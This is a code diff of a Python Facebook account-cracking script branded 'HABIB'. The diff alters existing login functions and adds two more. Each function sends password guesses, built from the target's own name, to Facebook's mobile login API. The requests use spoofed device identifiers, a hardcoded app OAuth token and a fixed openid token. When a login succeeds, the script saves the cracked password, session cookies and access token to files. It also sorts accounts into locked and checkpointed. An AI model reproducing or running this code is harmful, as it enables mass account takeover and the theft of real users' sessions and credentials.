@@ -119,8 +119,8 @@ def api2(ids,names,passlist,tl):
 'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
 'error_detail_type': 'button_with_disabled',
 'source': 'account_recovery',
-'locale': 'en_US',
-'client_country_code': 'US',
+'locale': 'bn_BD',
+'client_country_code': 'BD',
 'fb_api_req_friendly_name': 'authenticate',
 'fb_api_caller_class': 'AuthOperations$PasswordAuthOperation'}
             headers={'Host': 'b-graph.facebook.com',
@@ -132,7 +132,7 @@ def api2(ids,names,passlist,tl):
 'X-Fb-Net-Hni': '45201',
 'X-Fb-Connection-Quality': 'GOOD',
 'Zero-Rated': '0',
-'User-Agent': X1(),
+'User-Agent': X2(),
 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
 'X-Fb-Connection-Bandwidth': '24807555',
 'X-Fb-Connection-Type': 'MOBILE.LTE',
@@ -208,8 +208,8 @@ def api3(ids,names,passlist,tl):
 'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
 'error_detail_type': 'button_with_disabled',
 'source': 'account_recovery',
-'locale': 'en_US',
-'client_country_code': 'US',
+'locale': 'ne_NP',
+'client_country_code': 'NP',
 'fb_api_req_friendly_name': 'authenticate',
 'fb_api_caller_class': 'AuthOperations$PasswordAuthOperation'}
             headers={'Host': 'b-graph.facebook.com',
@@ -221,7 +221,7 @@ def api3(ids,names,passlist,tl):
 'X-Fb-Net-Hni': '45201',
 'X-Fb-Connection-Quality': 'GOOD',
 'Zero-Rated': '0',
-'User-Agent': X1(),
+'User-Agent': X3(),
 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
 'X-Fb-Connection-Bandwidth': '24807555',
 'X-Fb-Connection-Type': 'MOBILE.LTE',
@@ -297,8 +297,8 @@ def api4(ids,names,passlist,tl):
 'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
 'error_detail_type': 'button_with_disabled',
 'source': 'account_recovery',
-'locale': 'en_US',
-'client_country_code': 'US',
+'locale': 'hi_IN',
+'client_country_code': 'IN',
 'fb_api_req_friendly_name': 'authenticate',
 'fb_api_caller_class': 'AuthOperations$PasswordAuthOperation'}
             headers={'Host': 'b-graph.facebook.com',
@@ -310,7 +310,7 @@ def api4(ids,names,passlist,tl):
 'X-Fb-Net-Hni': '45201',
 'X-Fb-Connection-Quality': 'GOOD',
 'Zero-Rated': '0',
-'User-Agent': X1(),
+'User-Agent': X4(),
 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
 'X-Fb-Connection-Bandwidth': '24807555',
 'X-Fb-Connection-Type': 'MOBILE.LTE',
@@ -386,8 +386,8 @@ def api5(ids,names,passlist,tl):
 'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
 'error_detail_type': 'button_with_disabled',
 'source': 'account_recovery',
-'locale': 'en_US',
-'client_country_code': 'US',
+'locale': 'ar_DZ',
+'client_country_code': 'DZ',
 'fb_api_req_friendly_name': 'authenticate',
 'fb_api_caller_class': 'AuthOperations$PasswordAuthOperation'}
             headers={'Host': 'b-graph.facebook.com',
@@ -399,7 +399,7 @@ def api5(ids,names,passlist,tl):
 'X-Fb-Net-Hni': '45201',
 'X-Fb-Connection-Quality': 'GOOD',
 'Zero-Rated': '0',
-'User-Agent': X1(),
+'User-Agent': X5(),
 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
 'X-Fb-Connection-Bandwidth': '24807555',
 'X-Fb-Connection-Type': 'MOBILE.LTE',
@@ -475,8 +475,8 @@ def api6(ids,names,passlist,tl):
 'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
 'error_detail_type': 'button_with_disabled',
 'source': 'account_recovery',
-'locale': 'en_US',
-'client_country_code': 'US',
+'locale': 'my_MM',
+'client_country_code': 'MM',
 'fb_api_req_friendly_name': 'authenticate',
 'fb_api_caller_class': 'AuthOperations$PasswordAuthOperation'}
             headers={'Host': 'b-graph.facebook.com',
@@ -488,7 +488,7 @@ def api6(ids,names,passlist,tl):
 'X-Fb-Net-Hni': '45201',
 'X-Fb-Connection-Quality': 'GOOD',
 'Zero-Rated': '0',
-'User-Agent': X1(),
+'User-Agent': X6(),
 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
 'X-Fb-Connection-Bandwidth': '24807555',
 'X-Fb-Connection-Type': 'MOBILE.LTE',
@@ -532,8 +532,181 @@ def api6(ids,names,passlist,tl):
         time.sleep(20)
         api6(ids,names,passlist)
     except Exception as e:pass
-
-
-
-
-
+#<<_________[ METHOD 6 FOR INDONESIA ]_________>>#
+def api7(ids,names,passlist,tl):
+    try:
+        global oks,cps,loop,sim_id
+        sys.stdout.write(f'\r\r\033[91;1m [\033[97;1mHABIB-M7\033[91;1m] \033[97;1m{loop}|{tl} [\033[92;1mOK\033[97;1m:\033[92;1m{len(oks)}\033[97;1m] \033[97;1m[\033[91;1mCP\033[97;1m:\033[91;1m{len(cps)}\033[97;1m] \033[97;1m');sys.stdout.flush()
+        fn = names.split(' ')[0]
+        try:
+            ln = names.split(' ')[1]
+        except:
+            ln = fn
+        for pw in passlist:
+            pas = pw.replace('first',fn.lower()).replace(f'First',fn).replace(f'last',ln.lower()).replace(f'Last',ln).replace(f'Name',names).replace(f'name',names.lower())
+            random_seed = random.Random()
+            adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
+            data = {'adid': adid,
+'format': 'json',
+'device_id': str(uuid.uuid4()),
+'family_device_id': str(uuid.uuid4()),
+'secure_family_device_id': str(uuid.uuid4()),
+'cpl': 'true',
+'try_num': '1',
+'email': ids,
+'password': pas,
+'method': 'auth.login',
+'generate_session_cookies': '1',
+'sim_serials': "['80973453345210784798']",
+'openid_flow': 'android_login',
+'openid_provider': 'google',
+'openid_emails': "['"+ids+"']",
+'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
+'error_detail_type': 'button_with_disabled',
+'source': 'account_recovery',
+'locale': 'id_ID',
+'client_country_code': 'ID',
+'fb_api_req_friendly_name': 'authenticate',
+'fb_api_caller_class': 'AuthOperations$PasswordAuthOperation'}
+            headers={'Host': 'b-graph.facebook.com',
+'Content-Type': 'application/x-www-form-urlencoded',
+'Accept-Encoding': 'gzip, deflate',
+'Connection': 'keep-alive',
+'Priority': 'u=3, i',
+'X-Fb-Sim-Hni': '45204',
+'X-Fb-Net-Hni': '45201',
+'X-Fb-Connection-Quality': 'GOOD',
+'Zero-Rated': '0',
+'User-Agent': X7(),
+'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+'X-Fb-Connection-Bandwidth': '24807555',
+'X-Fb-Connection-Type': 'MOBILE.LTE',
+'X-Fb-Device-Group': '5120',
+'X-Tigon-Is-Retry': 'False',
+'X-Fb-Friendly-Name': 'authenticate',
+'X-Fb-Request-Analytics-Tags': 'unknown',
+'X-Fb-Http-Engine': 'Liger',
+'X-Fb-Client-Ip': 'True',
+'X-Fb-Server-Cluster': 'True',
+'Content-Length': '847'}
+            url = 'https://b-graph.facebook.com/auth/login'
+            po = requests.post(url,data=data,headers=headers).json()
+            if 'session_key' in po:
+                try:
+                    uid = str(po['uid'])
+                except:
+                    uid=ids
+                check = lock_chaker(uid)
+                if 'Locked' in check:
+                    print('\r\r\x1b[38;5;28m [HABIB-LOCK] '+uid+' | '+pas+'\033[1;97m')
+                    lk.append(uid)
+                    break
+                else:
+                    token = po["access_token"]
+                    print('\r\r\033[92;1m [HABIB-LIVE] '+uid+' | '+pas+'\033[1;97m');os.system('espeak -a 300 " Crack,   Successful,"')
+                    coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookies = f"sb={ssbb};{coki}"
+                    open('/sdcard/HABIB/HABIB-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n');open('/sdcard/HABIB/HABIB-Cookie-Token.txt','a').write(cookies+'|'+token+'\n')
+                    oks.append(uid);cek_apk(uid,pas,cookies)
+                    break
+            elif 'www.facebook.com' in po['error']['message']:
+                uid = str(po['error']['error_data']['uid'])
+                #print('\r\r\033[91;1m [HABIB-DEAD] '+uid+' | '+pas+'\033[1;97m')
+                open('/sdcard/HABIB/HABIB-CP.txt','a').write(uid+'|'+pas+'\n')
+                cps.append(uid)
+                break
+            else:
+                continue
+        loop+=1
+    except requests.exceptions.ConnectionError:
+        time.sleep(20)
+        api7(ids,names,passlist)
+    except Exception as e:pass
+#<<_________[ METHOD 6 FOR ALL COUNTIES ]_________>>#
+def api8(ids,names,passlist,tl):
+    try:
+        global oks,cps,loop,sim_id
+        sys.stdout.write(f'\r\r\033[91;1m [\033[97;1mHABIB-M8\033[91;1m] \033[97;1m{loop}|{tl} [\033[92;1mOK\033[97;1m:\033[92;1m{len(oks)}\033[97;1m] \033[97;1m[\033[91;1mCP\033[97;1m:\033[91;1m{len(cps)}\033[97;1m] \033[97;1m');sys.stdout.flush()
+        fn = names.split(' ')[0]
+        try:
+            ln = names.split(' ')[1]
+        except:
+            ln = fn
+        for pw in passlist:
+            pas = pw.replace('first',fn.lower()).replace(f'First',fn).replace(f'last',ln.lower()).replace(f'Last',ln).replace(f'Name',names).replace(f'name',names.lower())
+            random_seed = random.Random()
+            adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
+            data = {'adid': adid,
+'format': 'json',
+'device_id': str(uuid.uuid4()),
+'family_device_id': str(uuid.uuid4()),
+'secure_family_device_id': str(uuid.uuid4()),
+'cpl': 'true',
+'try_num': '1',
+'email': ids,
+'password': pas,
+'method': 'auth.login',
+'generate_session_cookies': '1',
+'sim_serials': "['80973453345210784798']",
+'openid_flow': 'android_login',
+'openid_provider': 'google',
+'openid_emails': "['"+ids+"']",
+'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
+'error_detail_type': 'button_with_disabled',
+'source': 'account_recovery',
+'locale': 'en_GB',
+'client_country_code': 'GB',
+'fb_api_req_friendly_name': 'authenticate',
+'fb_api_caller_class': 'AuthOperations$PasswordAuthOperation'}
+            headers={'Host': 'b-graph.facebook.com',
+'Content-Type': 'application/x-www-form-urlencoded',
+'Accept-Encoding': 'gzip, deflate',
+'Connection': 'keep-alive',
+'Priority': 'u=3, i',
+'X-Fb-Sim-Hni': '45204',
+'X-Fb-Net-Hni': '45201',
+'X-Fb-Connection-Quality': 'GOOD',
+'Zero-Rated': '0',
+'User-Agent': X8(),
+'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+'X-Fb-Connection-Bandwidth': '24807555',
+'X-Fb-Connection-Type': 'MOBILE.LTE',
+'X-Fb-Device-Group': '5120',
+'X-Tigon-Is-Retry': 'False',
+'X-Fb-Friendly-Name': 'authenticate',
+'X-Fb-Request-Analytics-Tags': 'unknown',
+'X-Fb-Http-Engine': 'Liger',
+'X-Fb-Client-Ip': 'True',
+'X-Fb-Server-Cluster': 'True',
+'Content-Length': '847'}
+            url = 'https://b-graph.facebook.com/auth/login'
+            po = requests.post(url,data=data,headers=headers).json()
+            if 'session_key' in po:
+                try:
+                    uid = str(po['uid'])
+                except:
+                    uid=ids
+                check = lock_chaker(uid)
+                if 'Locked' in check:
+                    print('\r\r\x1b[38;5;28m [HABIB-LOCK] '+uid+' | '+pas+'\033[1;97m')
+                    lk.append(uid)
+                    break
+                else:
+                    token = po["access_token"]
+                    print('\r\r\033[92;1m [HABIB-LIVE] '+uid+' | '+pas+'\033[1;97m');os.system('espeak -a 300 " Crack,   Successful,"')
+                    coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookies = f"sb={ssbb};{coki}"
+                    open('/sdcard/HABIB/HABIB-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n');open('/sdcard/HABIB/HABIB-Cookie-Token.txt','a').write(cookies+'|'+token+'\n')
+                    oks.append(uid);cek_apk(uid,pas,cookies)
+                    break
+            elif 'www.facebook.com' in po['error']['message']:
+                uid = str(po['error']['error_data']['uid'])
+                #print('\r\r\033[91;1m [HABIB-DEAD] '+uid+' | '+pas+'\033[1;97m')
+                open('/sdcard/HABIB/HABIB-CP.txt','a').write(uid+'|'+pas+'\n')
+                cps.append(uid)
+                break
+            else:
+                continue
+        loop+=1
+    except requests.exceptions.ConnectionError:
+        time.sleep(20)
+        api8(ids,names,passlist)
+    except Exception as e:pass
